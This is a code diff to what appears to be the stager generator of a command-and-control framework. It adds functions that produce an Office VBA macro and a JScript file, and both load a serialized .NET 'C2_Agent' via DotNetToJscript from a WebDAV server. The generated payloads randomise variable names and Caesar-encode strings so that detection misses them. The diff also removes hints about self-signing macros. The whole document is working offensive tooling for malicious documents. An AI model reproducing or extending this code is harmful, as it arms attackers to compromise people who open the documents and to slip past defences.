@@ -93,7 +93,6 @@ class GenStager:
 				f.write(macro)
 				f.close()
 				print helpers.color("[+] Macro stager saved in [stagers/macro.vb]")
-				print helpers.color("[*] Hint: Use this VBA macro in Excel, sign it even with a self-signed certificate, and save it in format 'Excel 97-2003'")
 		except IOError:
 			print helpers.color("[!] Could not write stager file [stagers/macro.vb]")
 			
@@ -119,8 +118,109 @@ class GenStager:
 				f.write(macro)
 				f.close()
 				print helpers.color("[+] Macro stager saved in [stagers/macro2.vb]")
-				print helpers.color("[*] Hint: Use this VBA macro in Excel, sign it even with a self-signed certificate, and save it in format 'Excel 97-2003'")
 		except IOError:
 			print helpers.color("[!] Could not write stager file [stagers/macro2.vb]")
 			
+	#-----------------------------------------------------------
+	@classmethod
+	def macro3(cls, stagerParameters):
+		"""Creates an Office VBA macro that launches a serialized version of the agent, thx to DotNetToJscript method"""
+		
+		# Randomize VBA variable names
+		varTmp = helpers.randomString(5)
+		varEncodedCommand = helpers.randomString(5)
+		varFinalCommand = helpers.randomString(5)
+		varFlag = helpers.randomString(5)
+		varExec = helpers.randomString(5)
+
+		caesarKey = helpers.randomInt(0,94)
+		varWebDavServer = helpers.randomString(4)
+		webDavServer = cls.caesar('vba', caesarKey, stagerParameters['serverName'])
+		funcInvertCaesar = helpers.randomString(10)
+		varEntryClass = helpers.randomString(4)
+		entryClass = cls.caesar('vba', caesarKey, "C2_Agent")
+		memoryStream = cls.caesar('vba', caesarKey, "System.IO.MemoryStream")
+		binaryFormatter = cls.caesar('vba', caesarKey, "System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
+		arrayList = cls.caesar('vba', caesarKey, "System.Collections.ArrayList")
+
+
+		parameters = {  'caesarKey' : caesarKey, 'varWebDavServer': varWebDavServer, 'webDavServer': webDavServer, \
+						'funcInvertCaesar': funcInvertCaesar, 'varEntryClass': varEntryClass, 'entryClass': entryClass, \
+						'memoryStream': memoryStream, 'binaryFormatter': binaryFormatter, 'arrayList': arrayList \
+		}
+	
+		macro = helpers.convertFromTemplate	(parameters, 'templates/macro3.tpl')
+		
+		try:
+			with open('stagers/macro3.vb', 'w+') as f:
+				f.write(macro)
+				f.close()
+				print helpers.color("[+] Macro stager saved in [stagers/macro3.vb]")
+		except IOError:
+			print helpers.color("[!] Could not write stager file [stagers/macro3.vb]")
+	
+	#-----------------------------------------------------------
+	@classmethod
+	def jscript(cls, stagerParameters):
+		"""Creates an JScript script that launchs a serialized version of the agent, thx to DotNetToJscript method"""
+		
+		# Randomize JS variable names
+		varTmp = helpers.randomString(5)
+		varEncodedCommand = helpers.randomString(5)
+		varFinalCommand = helpers.randomString(5)
+		varFlag = helpers.randomString(5)
+		varExec = helpers.randomString(5)
+
+		caesarKey = helpers.randomInt(0,94)
+		varWebDavServer = helpers.randomString(4)
+		webDavServer = cls.caesar('js', caesarKey, stagerParameters['serverName'])
+		funcInvertCaesar = helpers.randomString(10)
+		varEntryClass = helpers.randomString(4)
+		entryClass = cls.caesar('js', caesarKey, "C2_Agent")
+		memoryStream = cls.caesar('js', caesarKey, "System.IO.MemoryStream")
+		binaryFormatter = cls.caesar('js', caesarKey, "System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
+		arrayList = cls.caesar('js', caesarKey, "System.Collections.ArrayList")
+
+
+		parameters = {  'caesarKey' : caesarKey, 'varWebDavServer': varWebDavServer, 'webDavServer': webDavServer, \
+						'funcInvertCaesar': funcInvertCaesar, 'varEntryClass': varEntryClass, 'entryClass': entryClass, \
+						'memoryStream': memoryStream, 'binaryFormatter': binaryFormatter, 'arrayList': arrayList \
+		}
+	
+		macro = helpers.convertFromTemplate	(parameters, 'templates/jscript.tpl')
+		
+		try:
+			with open('stagers/agent.js', 'w+') as f:
+				f.write(macro)
+				f.close()
+				print helpers.color("[+] Macro stager saved in [stagers/agent.js]")
+		except IOError:
+			print helpers.color("[!] Could not write stager file [stagers/agent.js]")
+
+		
+	#------------------------------------------------------------------------
+	@classmethod
+	def caesar(cls, destLangage, key, inputString):
+		"""Dumb caesar encoding of an input string using a key (integer) to shift ASCII codes"""
+
+		encrypted = ""
+		for char in inputString:
+			num = ord(char) - 32 # Translate the working space, 32 being the first printable ASCI char
+			shifted = (num + int(key))%94 + 32
+		
+			# Escape some characters depending on the type of target langage (JS or VBA)
 			
+			if shifted == 34: # Escaping the double quote
+				if destLangage == 'vba':
+					encrypted += "\"{}".format(chr(shifted))
+				elif destLangage == 'js':
+					encrypted += "\\{}".format(chr(shifted))
+			elif shifted == 92:
+				if destLangage == 'js':
+					encrypted += "\\{}".format(chr(shifted)) # Escaping the backspace in JS
+				else:
+					encrypted += chr(shifted)	
+			else:
+				encrypted += chr(shifted)
+
+		return encrypted
